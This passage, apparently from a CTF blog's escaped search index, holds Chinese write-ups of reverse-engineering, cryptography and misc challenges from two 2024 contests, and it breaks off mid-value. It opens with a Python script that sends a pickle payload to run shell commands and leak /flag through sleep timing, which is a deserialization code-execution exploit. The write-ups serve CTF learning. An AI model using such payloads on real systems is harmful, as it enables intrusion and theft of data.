&#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;]s = requests.Session()url = &#x27;http://xxxxxx&#x27;s.post(f&#x27;&#123;url&#125;/register&#x27;,data=&#123;&#x27;username&#x27;:&#x27;x&#x27;,&#x27;password&#x27;:&#x27;y&#x27;&#125;)result = &#x27;&#x27;for i in range(1,100): for char in chars: payload = f&quot;if [ `cut -c &#123;i&#125; /flag` = \\&#x27;&#123;char&#125;\\&#x27; ];then sleep 1;fi&quot; payload_b64 = base64.b64encode(f&#x27;&#x27;&#x27;(cos\\nsystem\\nS&#x27;&#123;payload&#125;&#x27;\\no.&#x27;&#x27;&#x27;.encode()) data = &#123; &#x27;username&#x27;:&#x27;x&#x27;, &#x27;password&#x27;:&#x27;y&#x27;, &#x27;statement&#x27;:payload_b64 &#125; try: req = s.post(f&#x27;&#123;url&#125;/login&#x27;,data=data,timeout=1) except: result += char print(result) break if (char == &#x27;~&#x27;): break ​ Reverseez_re 牢弟很喜欢把秘密藏在乱糟糟的地方不让大家看，你能帮我找找他的秘密吗？ main() 函数除花，去掉 db 0E8h，分析逻辑为 AES-CBC加密。 去反调试 IsDebuggerPresent()，动调得key和iv和密文： 123key = addddb082dd94dcabad5d75639eac9daiv = 633bbdfb3a2cc6ff5c0862a2cda2eab4c = dde04c75973314b817b61911618a60234616e21a65c35b2668f5ad30b1ee4bc6abb59ebb73954ac278efcba9be71e1a0 AES-CBC解密得到flag：SYC&#123;W0w_Y0U_fOUNdDD_TLS_AND_AeS&#125;。 ​ 贝斯！贝斯！ 华强摸了摸你的ida并问到:“你这base保熟吗。” 动调看逻辑： 第一步变表base58，表：Zix7BucHvEV2UAf5e8hKsNDkQ1pq9gjC6RbFwMyLToSnJYWXdaG3r4Pztm； 第二步，先结合 sub_4018FF()+sub_4019EE()，RC4，key：happy_happy； 第三步变表base85，根据RC4打乱码表，表：eM+wr=x8aYZ/[zU$yRB&amp;kbO;%p0P5f*7d(n]1Eug4ojc62AC,v39!h-^qQ.G?s)i:DFlS&lt;&gt;#@HINJTmtKLVWX。 已知密文：RjB6Myu#,&gt;Bgoq&amp;u.H(nBgdIaOKJbgEYj1GR4S.w： 第一步，base85还原得到：6pmB34FC9sbYxcKP9rjGGiyRsx1s6c72； 第二步，由于时间戳问题，进入 sub_401550()，提取当前日期的年份、月份和日期，并使用它们来创建随机数生成器的种子。 生成不同的码表来爆破，写入 table.txt： 12345678910111213141516171819202122232425#include &lt;stdlib.h&gt;int main()&#123; char Str[68]; strcpy(Str, &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;); int str_len = strlen(Str); //2024-11-10 00:00:00 = 1731168000 for(int k=1735660800;k&gt;=1704038400;k-=86400) &#123; int tmp[60] = &#123;0&#125;; char table[68] = &#123;0&#125;; int j; srand(k); for (int i = 0; i &lt;= 57; ++i ) &#123; do j = rand() % str_len; while ( tmp[j] ); table[i] = Str[j]; tmp[j] = 1; &#125; table[58] = 0; printf(&quot;%d %s\\n&quot;,k,table); &#125; return(0);&#125; 再解码： 123456789101112import base58f = open(&#x27;table.txt&#x27;).readlines()for line in f: now = line.strip().split(&#x27; &#x27;) time = int(now[0]) table = now[1] m = base58.b58decode(b&#x27;6pmB34FC9sbYxcKP9rjGGiyRsx1s6c72&#x27;, alphabet=table.encode()) if b&#x27;SYC&#123;&#x27; in m or b&#x27;flag&#123;&#x27; in m: print(time,table,m) # 1725811200 n6KPVUdeqBjQvDG51Nof9uJHW7gRAtLrCcTkXhz2ips3Sb8yFmYa4xZMEw b&#x27;SYC&#123;th1s_ls_an_ez_base&#125;&#x27; ​ Reverse/CryptoMath 离散对数DLP，RSA Modular binomial, base64变表（可与队友联合解题，也可学习些二进制基础，对以后有益），提交的flag格式：flag{xx} 已知输出： 1234567891011121314151617181920212223242526c_output=&#x27;d0BURFg2dLNFBLDySWN5RmrUS0k2ejDzdJRLSJkLR0gGBqIVSmR3RLR5RmI1BqRLdqlWemk4Bqr4B0rLdqD0S01HemS0Bqx6d01LS0t2djt5dWO1BLV1Bqr3dL1LSjR6RWk4eq15BFh0R0x6R0OzdWBHSmg3dWg5dmr2RFB6BLDyd0DVRjrHdmg3ejdyeqkHR0gGB0tFRLg4BFBGemNFSJr6BFN3d0IzB0C4B013RjyySJhzRjuydqxFd0D1BjuyemlVS0B6BWk2BLDzejBURml0RLh0RjD0BJR2SWd0BqCLdjN2RFh0RjRHR0uzSj1Ldj1FBWR2R0hySqy0RmS1dg==&#x27;#========================================================================n1_output=&#x27;BjI1S0t5djR4dj14dWBURFS0ejCFSWIWdJg4BWrLeqDzejgHemSVeq14ejk6RFSzRLtGBjdyS0xGBqB5R0R5RjhyBFr4SjO0dqSzRjxUSmR2d0OyBFrGdFhVS0u1dmhVBJr4Rjr4R0d1BjB4BFIWRLCFSmgGRWBUS0CGSjC5Sj1HeqdzBqS0SjrGRLNUBJSVdjk4eqg2RFRUBqNHS0k4d0g6Sjg5ejD0RFN5BFd1S0DzR0C2ejdVdqBGRLk2Smk5dLR2BLN4BWd0BmNLdjt2BjN4eq13dFlzdWB5eqgLB01UR0g2eqDVdWgLBWrLBjI1SjSWSqSWdJNUSqVVeJSyRx==&#x27;#========================================================================c1_output=&#x27;dmrGd0yVeJkLSjhVSWk3BmR3d0S1dLu1SqVyBjB5BWR3BL1HRWBUSjIWRjhVeqNHRWkFRjdzdWIyd0r4emhVBqO0dJlVRLk6dJk6BFOWBqxLdWNGR0N3S0kLdJr2B01GdqhVejx4RWh0BFI0SqtGRjx5BLd0djgLSmr5RFR2S0gFd0lWRWg2dWO0B0I1BLyVSJgFBJrFeqt4BquVBqtUejx4RFI0ejuVBjCUejR5BJIVRFlVSjdzSWR5BLgHBLBUdWr2RFSzBqR5SJRGSqlzRFkURLuWRWrFRmk5dJSzSmI1dmR3dWIyej14S0NLSmkURFOVeJrHSWB4d0S1dmSy&#x27;#========================================================================hint1_output=&#x27;RLdWSqx2RWlVR0NLd0d1dqr2eqgHSWhydjxUeq1Gd0R6dmO0RWNUd0BGejx6S0xLeqkLRjS0ejSVd0h0eJl0ejgFdqk2BqVzdLCLdWkLR0rHdFl0S01LBJk6ejhWRLg2eJB2RmBFRWSyej12djCGeqB4BJN5d0rURWBUeJg5BLNGdjtGBJR3d0NHdLh0dFS1BLxURWrUSmR2SjC3BqrUd0BLdjRFSjR3RWrUdmk3RjB4SjNURjg3R0tUdLt2RLSyRml1eqVyRjgLBjC3djCHSjxFeq12BmBHBjxFBjr6BJR3BJSVBjx6SjBLR0x4dLC5SjrGBjg6BqkGdjVWBLx4&#x27;#========================================================================n2_output=&#x27;BFd0BqCFSjD1Smr4dFRHBLg2Bjx5BqVyRLy0Bmr2dqt6djy0dFhyBqr6B0B5BquWSqN3djB4BLR5BFdVemSWRLdWRmrGdqx6BFr6eJlyBmk6BjIyBLh0BLgUS0N4R0gURWN4Bqg2dLtGdFk2SquWdjrLejN5emkFBWSzej1LdjR6S0uVdLC3SjCUBjV0RFO0dqr2ejkFSjyydWd0BFk4Bjx5BWdydWlzBjC3djx4d0DWSjDWdFB4dWhyd0dVdmgFBjRUSmr3dL14SjxFS0dVBWkHBqh1BL1USqr2B013B0V1BLCLBjtLeJR5BLhVd0rURjD1Smd0Sjr6RWhVdJd1&#x27;#========================================================================c2_output=&#x27;BWhVdmg3Bj15RWR6dLVzRjdVRjBLeJO1dqBUBJr5eJg4B0BLSJrUSjC3BJNLRmr6d0g2Rj12B0uVSWRGequzdJgGdJIyBFBGSJBLdqyWB0r2B0gGej1GRmkLBWSzeqR2B0xUBLlVd0r6BLhWemlWd0dVemN3d0O0dqDzdWN4dFBUBjBLRFI1dqRGBWBURmrGS0k5dmgLS0u1BqRGR0R5equ1BLDVdqB2dWB2RmSVRFlySjCLBmBLBjrFRFdWejuyRFI1SJN6RmR2BWg2djV0d0I0SjD1S0uzdjS0SjIVBJOyBjl0S0NHRml1djg5djR5dmIyejBUeJSzdq12Sjlz&#x27;#========================================================================hint2_output=&#x27;BWh1BLDzBqxFS0I0eJSydLxFBJl1dmd1SjIVBqOyBqR6SjxGB0OySj1HB0B3dLVWdLR2Sql1RjxFSmB6djDzBWhWSmkFejB2dqRLRjCFR0rLBFgGejI0BFdWRWk3S0xHRjgLRWSySjuWB0l0SWNLSmSzd0I0BjDyRjt5BJIydLSVB0N6ejN2Bj1HdWSzBjSWBmIVBLhyeqRGRFNGRWrFdqI1djRLdFNGBJrUB0C6dLgGemkURLrHSqrLdLN4djVydJk4dJrGB01HRLlzB0tUSWrFSqx2RmO0BmN2d0SzB0VzRWrHRjIyBWlyemkHRmg3d0y0BjhyS0rGRLhWdjDV&#x27;#========================================================================hint3_output=&#x27;BLkGdjr2BqO1Sjd0R0DWd0gHBjg3BmrGR0BFd0lzBFh1Sqr3RLVWBJI1BqtLejy0dJlVBLl0BqIWS016dWh1B0k2dmh0dqI1dj15SWdydjyzdqx3Sjd0Sqr5dJgGRLDyd0t5ejSWejlWRFlzRL1LejIWBjD0eqV1Smg6R0IVS0dVdjC5dJIzeJSVdmlyBLdVBWIWR0I0SqVyS0u1eqhWRFr5dFk3dWkGdjVzBjBFdjtHRLNUS0RGemrFdJR4SjN4d0C2ejOVSmk6d0yyS0NLBqhWdFBFeqVVRFkFBJrUdqIzRjx5BqD1SqD1BWIWBmr2djgUemIWSqr4RFRUSmIy&#x27;#========================================================================a_output=&#x27;RLC6eJIWBLOVdj14ejyWBjx6BqkUSjCUSqg2d0d0BLhydLIzdmhzejy1BJg3BLxLBqk5BqO0SjRHRFhydLOWd0xUdLR4dWS1eJgUBLdzdjrFBLdVd0d0d0dzSjkURFBLdqk2Sjy1Bqh1B0xGSmhyBLkLdmR6BmrHRL12ejSWemk3R0R6Smh0eqIVR01GBmg3dmNUSmd0B0DzdJgFd0t5dLCUSjtLRmR5BjD1BmOVS012BjdVejtHd0CLBWg6d0yWSqu1B0gLSqC5RFdzSJOVR0CGdjuVdmr3RmSWRWBUdLSVeqdWeqlzSJkFeqkFBjy1dj16SWk6BFgGdjgUBjVyBx==&#x27;#======================================================================== 分析程序，base64变表为 CDEqrIJKNOPABdefghijklmQRSTstuvwxyz01VWXYZabcnop456L23FGHUM789+/。 分别解码得到： 1234567891011121314151617181920212223242526c_output=&#x27;639cd472630afb1aa9f5490b4f3de3b4701eef5c61aad06345f9e001021340cf989fc082693f745716bd39d015793e62be08913dcb82b2b6c8ed56d15a4cc230a60ea185d593a858b47276c403c79b6da23b561b200295a8addba7a48660d17a9eef322e430b939aecc4ca0c0f4fcc003524cdca68b7be935962f4b4ad8cafd5&#x27;#========================================================================n1_output=&#x27;11df715605906c9cfc906faf4d02a380b9489fe890952cfbc7713af87031b61a4a3a0e2c46ba89ef462a3a77def7d5de0a0a10b3d1303afc06ed7bc9f07e01e9883b06ce17c290fe550844cf9028f50642e4190ccb13cdf0bb0493e437c54ee17643202cc1b35741208957eb6c1843299b4480e6d32a311de6fd6f4b9d9e8fab&#x27;#========================================================================c1_output=&#x27;5a768e8e3e4efe51f566d77dd9a1312f5398bc9e1fa4e828be6a3b6aa6109de02c4eec524e23bf0836b7b25f534a429744e980bdc3acd77a8133c543ea1cf4f4665fbd46bc21d38edd60a687007e079980cac97e1099610aeceee3bff13483396a4cfb061df7d5bce9c7fba6ae14fbead5f56aa990f23ee9cbe8a8fc066d5fa&#x27;#========================================================================hint1_output=&#x27;c3fd84beeb2363d414848fda5898976625bcbb9637982f83853a6c96e64c8ec94645409b7036e3b187ecf930e294fc448c4ac6bfa9945078300b1619bc98d13275770f562874c7fd389ba9ef4e05019633566e65ba95e5a30e29a45b79774c6aaed89aa43105508e868941c81861120f50fe182e33b80701e1714205759f380&#x27;#========================================================================n2_output=&#x27;3cc006e0dea07f834418109ac8c1a447258c7da01223107fd255303613ce9ffc3faa74823a28ea1e211a34c349f20b49bb00447777e4d7f5139219e62fb993562f7e705e0919ccbc414956e8a6cc3e01812ca6eb10558060fe0f7c06da63e5d6169ea5790e86f3e2e804d399d1429529d3031738f134e619a0decce12bde4cd&#x27;#========================================================================c2_output=&#x27;2de5d5191bf279ba3ea338bd4390a18d0233da9e050b3aa2644a9427eff787b4d74aa3c7dc348f214247997ae32fb86428935e61234f9ef63e9b562c40b6b07c9133cad4672c9aa7f515d3f7d067b6187d30e4346c4afeceae031c3116ccf97acaddb2af42d459c61ce0df7b56ce1e0ba15cf28aed5415615aa9398fb494e5b&#x27;#========================================================================hint2_output=&#x27;2dd30b086f1c8fa7860ed5cde1e02a062e8722ae9823579f764d5da86ec250b2dfee6934463a06b133d791c3cfbe5f88a43bfae7f25cfb3efb61c10aa710aa76e2229241986fb16f1ae34a867cb7ba641d5637b70a92027479e9c18d1372059a4e04a7298c5b279fa6d84abc1b466b29bba8a1a2ea9e8ad568c14af17c4f50e&#x27;#========================================================================hint3_output=&#x27;35751402de3cb0f6481451a7b3665b3ddd15c9f0ad07398c4ee35c01ff926dd2545dc41d591fca58b485e3cd114d7c0a67196f95fcebc9391f10c89ded2b1ef3e5014ab8fe5ea33e2afb1cd9af7d84fca17e56e759b136578c29f679a64f0e2060492eee268af2304f7c689ece60a941ba8100dd0d2af1a45499afd10cf9eaa&#x27;#========================================================================a_output=&#x27;c028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2&#x27;#======================================================================== 分析计算部分的逻辑为： $c_1 = p^{e_1} \\pmod {n_1}$ $h_1 = 2023p_1+2024 \\pmod {q_1}$ $c_2 = q^{e_2} \\pmod {n_2}$ $h_2 = (2023p_2+2024q_2)^{2323} \\pmod {n_2}$ $h_3 = (2024p_2+2023q_2)^{2424} \\pmod {n_2}$ $a = g^e \\pmod n$ 同题 Number theory，数论+DLP（Pohlig–Hellman）求解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from Crypto.Util.number import *def babystep_giantstep(g, y, p, q=None): if q is None: q = p - 1 m = int(q**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step try: gm = pow(g, -m, p) # gm = g^&#123;-m&#125; except: return None ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: return q * m + table[ygqm] ygqm = (ygqm * gm) % p return None# Pohlig–Hellman法def pohlig_hellman_DLP(g, y, p): crt_moduli = [] crt_remain = [] for q, _ in factor(p-1): if q &lt; 10^7: x = babystep_giantstep(pow(g,(p-1)//q,p), pow(y,(p-1)//q,p), p, q) if (x is None) or (x &lt;= 1): continue crt_moduli.append(q) crt_remain.append(x) x = crt(crt_remain, crt_moduli) return xc = 0x639cd472630afb1aa9f5490b4f3de3b4701eef5c61aad06345f9e001021340cf989fc082693f745716bd39d015793e62be08913dcb82b2b6c8ed56d15a4cc230a60ea185d593a858b47276c403c79b6da23b561b200295a8addba7a48660d17a9eef322e430b939aecc4ca0c0f4fcc003524cdca68b7be935962f4b4ad8cafd5n1 = 0x11df715605906c9cfc906faf4d02a380b9489fe890952cfbc7713af87031b61a4a3a0e2c46ba89ef462a3a77def7d5de0a0a10b3d1303afc06ed7bc9f07e01e9883b06ce17c290fe550844cf9028f50642e4190ccb13cdf0bb0493e437c54ee17643202cc1b35741208957eb6c1843299b4480e6d32a311de6fd6f4b9d9e8fabc1 = 0x5a768e8e3e4efe51f566d77dd9a1312f5398bc9e1fa4e828be6a3b6aa6109de02c4eec524e23bf0836b7b25f534a429744e980bdc3acd77a8133c543ea1cf4f4665fbd46bc21d38edd60a687007e079980cac97e1099610aeceee3bff13483396a4cfb061df7d5bce9c7fba6ae14fbead5f56aa990f23ee9cbe8a8fc066d5fae1 = 39847h1 = 0xc3fd84beeb2363d414848fda5898976625bcbb9637982f83853a6c96e64c8ec94645409b7036e3b187ecf930e294fc448c4ac6bfa9945078300b1619bc98d13275770f562874c7fd389ba9ef4e05019633566e65ba95e5a30e29a45b79774c6aaed89aa43105508e868941c81861120f50fe182e33b80701e1714205759f380n2 = 0x3cc006e0dea07f834418109ac8c1a447258c7da01223107fd255303613ce9ffc3faa74823a28ea1e211a34c349f20b49bb00447777e4d7f5139219e62fb993562f7e705e0919ccbc414956e8a6cc3e01812ca6eb10558060fe0f7c06da63e5d6169ea5790e86f3e2e804d399d1429529d3031738f134e619a0decce12bde4cdc2 = 0x2de5d5191bf279ba3ea338bd4390a18d0233da9e050b3aa2644a9427eff787b4d74aa3c7dc348f214247997ae32fb86428935e61234f9ef63e9b562c40b6b07c9133cad4672c9aa7f515d3f7d067b6187d30e4346c4afeceae031c3116ccf97acaddb2af42d459c61ce0df7b56ce1e0ba15cf28aed5415615aa9398fb494e5be2 = 44021h2 = 0x2dd30b086f1c8fa7860ed5cde1e02a062e8722ae9823579f764d5da86ec250b2dfee6934463a06b133d791c3cfbe5f88a43bfae7f25cfb3efb61c10aa710aa76e2229241986fb16f1ae34a867cb7ba641d5637b70a92027479e9c18d1372059a4e04a7298c5b279fa6d84abc1b466b29bba8a1a2ea9e8ad568c14af17c4f50eh3 = 0x35751402de3cb0f6481451a7b3665b3ddd15c9f0ad07398c4ee35c01ff926dd2545dc41d591fca58b485e3cd114d7c0a67196f95fcebc9391f10c89ded2b1ef3e5014ab8fe5ea33e2afb1cd9af7d84fca17e56e759b136578c29f679a64f0e2060492eee268af2304f7c689ece60a941ba8100dd0d2af1a45499afd10cf9eaap1 = GCD(n1, pow(2024,n1,n1)-h1)q1 = n1 // p1f1 = (p1-1)*(q1-1)d1 = inverse(e1,f1)p = int(pow(c1,d1,n1))print(p)A1 = 2023B1 = 2024A2 = 2024B2 = 2023ea = 2323eb = 2424t1 = pow(A1, ea*eb, n2)t2 = pow(A2, ea*eb, n2)temp1 = t2 * pow(h2, eb, n2)temp2 = t1 * pow(h3, ea, n2)p2 = GCD(temp1-temp2, n2)q2 = n2 // p2f2 = (p2-1)*(q2-1)d2 = inverse(e2,f2)q = int(pow(c2,d2,n2))print(q)a = 0xc028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2g = 0x488d156b0cbef000f1bf6c47006a3595n = 0x9c5ab7c1cc9a4f60b1d53afafd7016d00e811e5a1c6fb258c75a246a0630a75644100828e21757de1d9a5ff99ebd05257aa9d895c1de40a2eb619fa52f32b38acb52669841d528351df863137b0a14f4aff6506cf0c7cdf1801c2bd3d7fb4e583811f4f771f7e5c0e5f42a85839affed38df8b913fa6a4e782adc028e5e86162fe = pohlig_hellman_DLP(g, a, n)print(e)assert pow(g,e,n) == af = (p-1)*(q-1)d = inverse(e,f)m = pow(c,d,p*q)print(long_to_bytes(int(m)))# b&#x27;flag&#123;IKnowYouLikeReverseAndCrypto&#125;&#x27;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2024赛","slug":"2024赛","permalink":"https://lazzzaro.github.io/tags/2024%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HSCCTF 2024","slug":"match-HSCCTF-2024","date":"2024-03-11T03:28:02.000Z","updated":"2024-03-14T12:47:15.999Z","comments":true,"path":"2024/03/11/match-HSCCTF-2024/","permalink":"https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/","excerpt":"","text":"​ 本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。 Rank: 1 ​ CHECKINCHECKIN 关注公众号：#红客突击队/#中龙红客突击队，并发送hscctf2024以获取flag 分别给两个公众号发hscctf2024，得到字符串拼接：hscctf&#123;hscctf2O24_w3lc0me&#125;。 ​ MISCкатюша flag形式为:HSCCTF{this_is_an_example} 查看源码，提取rgb值拼接： 4, 8, 5, 3, 4, 3, 4, 3, 5, 4, 4, 6, 7, 11, 5, 9, 6, 15, 7, 5, 5, 15, 6, 8, 6, 1, 7, 6, 6, 5, 5, 15, 7, 2, 6, 5, 6, 3, 6, 5, 6, 9, 7, 6, 6, 5, 6, 4, 5, 15, 7, 4, 6, 8, 6, 5, 5, 15, 6, 12, 6, 5, 7, 4, 7, 4, 6, 5, 7, 2, 5, 15, 6, 15, 6, 6, 5, 15, 4, 11, 6, 1, 7, 1, 6, 9, 7, 5, 7, 3, 6, 8, 6, 1, 7, 13 转换为16进制： 4853434354467b596f755f686176655f72656365697665645f7468655f6c65747465725f6f665f4b617169757368617d 转为字符串：HSCCTF&#123;You_have_received_the_letter_of_Kaqiusha&#125; ​ CRYPTOFUNNY 出题人很幽默,给你p和q了直接解吧 直接运行。 123456789101112from Crypto.Util.number import *from gmpy2 import *p = 1627858721743596752497831640628357323459243890844363792736407789751577427319257708507686114456632938183775129585728892845205290864750578798354859933996208521450129131173352490118085939969385911306718129785035108056909135931322755908602656567223998858450130768625587559935064753603718657989533793373124922891077849376447589198239126291127263234784363556777780461489387706699053671315621968807065360907667815336609878856798387057891974730460404647229308105442629038061284060276648993434681114539955086828451085582033288860959729755856478065093327544217813990665326820156340461326538271909605715822484950196033809892232121330623027855970475888202583512234213349462680452400729903400494519431590431864717223438807093669836615356855072370571595889807712166659061190031457954071146645411277702230847389264989391715763232453605404095019402186331633202953693057641475300619482863265936513394341066776619336452923951439714749067348507q = 165059760196977338034268528857897083190717585647808271832795575354736221674892279730906525407442580833042731114617534865267230347093979480666213073939602212663043286794259410177026619955285626139270678815060566416554620185859901611571955490060241822054715533030464833509114500388615748465579240918292431860839c = 209347444484196477254668267578954904181293909211985372842733666165076889646025992007884927283300662833989678431462547742385291078285045060028956748455410812196305788814280968487973559115983082461315009316488143477261307107939530267533197821947240438534411830018967506368459544025037634267899970815198992392565948727381322854560823769432552779881938316107779842525092269591932257206582810678457433166038809740255591841951300818106018061065936083887559841543250701094558114335651396741896281230175124133873529005816838785880680073159461666783649744640398010841282229366323100807220116460976549981263966530038289223576133865992894885483308732021144420507955669760623032114718333853671281281221009397028372653797668774820725717817362383394165014402977767667433542733963298092312930702496796235196487999167666133884266829605503363510544384236303968829214389757297563873395131798724306227675722494797069994655456021649231626359765579028950908065367760981736933167557841586896807116262630848742514005606289980676609588756946993271763119859088002784499062149533167332388600036550273743940503131248513795389688869470432261503038708892320267815658450917855334244502333938120781251564676408212996623419957317150267768978807968208353379334556945d = inverse(65537, q - 1)m = powmod(c, d, q)print(long_to_bytes(m))#HSCCTF&#123;xin_nian_hao_ya&#125; ​ REAL_SIGN_IN 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *from gmpy2 import *flag = &#x27;HSCCTF&#123;*************************&#125;&#x27;m = bytes_to_long(flag.encode())e = 65537for i in range(1, 11): p = getPrime(1024) q = getPrime(1024) n = p * q c = powmod(m, e, n) print(&quot;n&quot;, i, &quot;=&quot;, n) print(&quot;c&quot;, i, &quot;=&quot;, c)&#x27;&#x27;&#x27;n1 = 13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813c1 = 10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971n2 = 13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909c2 = 3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076n3 = 20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453c3 = 11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315n4 = 19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889c4 = 12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720n5 = 15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177c5 = 1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839n6 = 22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243c6 = 16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055n7 = 20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577c7 = 19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784n8 = 